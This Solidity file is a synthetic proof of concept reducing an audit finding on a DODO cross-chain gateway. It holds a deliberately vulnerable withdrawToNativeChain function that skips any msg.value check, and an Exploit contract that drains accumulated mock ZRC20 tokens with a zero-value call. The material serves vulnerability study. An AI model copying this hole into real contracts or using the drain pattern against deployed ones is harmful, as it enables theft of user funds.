// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    DODO Cross-Chain DEX — [H-2] Any attacker will steal accumulated ZRC20
    tokens from GatewayTransferNative (Sherlock 2025-05, #58579)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: withdrawToNativeChain skips transferFrom when zrc20 ==
    _ETH_ADDRESS_ but never requires msg.value >= amount. Attacker claims a
    large native amount with value:0, then points decoded.targetZRC20 at a real
    accumulated ZRC20 and drains it. Vulnerable branch preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduction of GatewayTransferNative.withdrawToNativeChain.
///         Source: GatewayTransferNative.sol#L534-L537
///         (sherlock-audit/2025-05-dodo-cross-chain-dex @ d4834a4).
contract GatewayTransferNative {
    // ZetaChain native-token placeholder used by the real contract.
    address public constant ETH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 public constant GAS_FEE = 0;

    /// @param zrc20  input token (or ETH_ADDRESS placeholder)
    /// @param amount claimed input amount
    /// @param targetZRC20 token actually withdrawn (from decoded message)
    /// @param receiver destination of the withdrawn tokens
    function withdrawToNativeChain(
        address zrc20,
        uint256 amount,
        address targetZRC20,
        address receiver
    ) external payable {
        if (zrc20 != ETH_ADDRESS) {
            require(
                MockERC20(zrc20).transferFrom(msg.sender, address(this), amount),
                "INSUFFICIENT ALLOWANCE: TRANSFER FROM FAILED"
            );
        }
        // FIX: if (zrc20 == ETH_ADDRESS) require(msg.value >= amount, "INSUFFICIENT NATIVE TOKEN");

        // Empty swapData path: attacker-chosen `amount` is used as-is against targetZRC20
        // even when zrc20 == ETH_ADDRESS and msg.value == 0 (no native was provided).
        uint256 outputAmount = amount; // @> VULN: amount accepted with no msg.value check when zrc20 == ETH_ADDRESS — drains real targetZRC20 from accumulated balances
        _withdraw(targetZRC20, receiver, outputAmount - GAS_FEE);
    }

    function _withdraw(address token, address receiver, uint256 amount) internal {
        require(MockERC20(token).transfer(receiver, amount), "out");
    }
}

contract AttackerReceiver {}

/// CREATE order: usdc (1), gateway (2), attackerRecv (3).
contract Exploit {
    MockERC20 public usdc;
    GatewayTransferNative public gateway;
    AttackerReceiver public attackerRecv;

    uint256 public stolen;
    uint256 public constant STOLEN_AMOUNT = 100 ether;

    constructor() {
        usdc = new MockERC20("USDC.Z"); // 1
        gateway = new GatewayTransferNative(); // 2
        attackerRecv = new AttackerReceiver(); // 3

        // Accumulated ZRC20 sitting on the gateway from prior ops / refunds.
        usdc.mint(address(gateway), STOLEN_AMOUNT);
    }

    function run() external {
        uint256 gwBefore = usdc.balanceOf(address(gateway));
        uint256 recvBefore = usdc.balanceOf(address(attackerRecv));

        // ATTACK: zrc20 = ETH placeholder (bypasses transferFrom), value:0,
        // targetZRC20 = real USDC.ZRC20, amount = full accumulated balance.
        gateway.withdrawToNativeChain{value: 0}(
            gateway.ETH_ADDRESS(),
            STOLEN_AMOUNT,
            address(usdc),
            address(attackerRecv)
        );

        stolen = usdc.balanceOf(address(attackerRecv)) - recvBefore;
        require(stolen == STOLEN_AMOUNT, "stolen");
        require(usdc.balanceOf(address(gateway)) == gwBefore - STOLEN_AMOUNT, "gw drained");
        require(stolen > 0, "harm not demonstrated");
    }

    receive() external payable {}
}
